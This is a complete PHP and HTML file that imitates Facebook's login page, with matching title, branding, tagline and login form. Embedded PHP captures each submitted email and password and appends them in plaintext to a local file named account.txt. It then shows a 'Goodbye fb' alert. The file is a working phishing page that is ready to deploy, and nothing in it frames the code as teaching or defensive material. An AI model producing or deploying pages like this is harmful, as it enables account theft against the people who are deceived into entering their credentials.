<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - login or sign up</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="icons8-facebook.svg" type="image/svg+xml" sizes="any">
</head>
<body>
    <?php
        if(isset($_POST['submit'])){
            $email = $_POST['email'];
            $password = $_POST['password'];
    
            $file = fopen('account.txt','a');
            $file_string = "Email: " . $email . "\nPassword: " . $password . "\n\n";
            fwrite($file, $file_string);
            fclose($file);
        
        echo "<script>alert('Goodbye fb')</script>";
        }    
    ?>
    <section>
        <div class="container">
            <div class="facebook-first-section">
                <div class="facebook-title">
                    <h2>facebook</h2>
                    <p>
                        Connect with friends and the world around you on Facebook.
                    </p>
                </div>              
            </div>
            <div class="facebook-second-section">
                <form class="facebook-form" method="post">
                    <input type="email" placeholder="Email or phone number" style="padding-left: 0.8em;" name="email">
                    <input type="password" placeholder="Password" style="padding-left: 0.8em;" name="password">        
                    <input class="facebook-login" type="submit" value="Log in" name="submit">
                    <a href="#" class="facebook-forgot">Forgot password?</a>
                    <div class="facebook-border"></div>
                    <input class="facebook-create-account" type="button" value="Create new account">
                </form>
                <div class="facebook-create-page">
                    <a href="#">Create a Page</a>
                    <span>for a celebrity, brand or business.</span>
                </div>
            </div>    
        </div>
    </section>
</body>
</html>